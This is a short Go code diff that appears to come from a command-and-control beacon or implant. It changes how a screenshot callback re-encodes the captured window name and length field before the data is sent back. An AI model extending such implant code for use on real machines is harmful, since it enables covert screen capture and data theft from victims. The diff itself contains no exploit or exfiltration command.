@@ -4,6 +4,7 @@ package packet
 
 import (
 	"bytes"
+	"encoding/binary"
 	"errors"
 	"fmt"
 	"github.com/Microsoft/go-winio"
@@ -323,7 +324,21 @@ func HandlerJob(b []byte) ([]byte, error) {
 
 	if result != "" {
 		if callbackType == CALLBACK_SCREENSHOT {
-			DataProcess(callbackType, []byte(result[4:]))
+			buffers := bytes.Split([]byte(result), []byte("\x00\x00\x00"))
+			if len(buffers) > 3 {
+				windowsName, err := CodepageToUTF8(buffers[len(buffers)-2])
+				if err != nil {
+					ErrorProcess(errors.New("result error"))
+				}
+				buffers[len(buffers)-2] = windowsName
+				bBytes := make([]byte, 4)
+				binary.BigEndian.PutUint32(bBytes, uint32(len(windowsName)-1))
+				buffers[len(buffers)-3] = bytes.ReplaceAll(bBytes, []byte("\x00"), []byte(""))
+				resultBytes := bytes.Join(buffers, []byte("\x00\x00\x00"))
+				DataProcess(callbackType, resultBytes[4:])
+			} else {
+				DataProcess(callbackType, []byte(result[4:]))
+			}
 		} else {
 			DataProcess(callbackType, []byte(result))
 		}
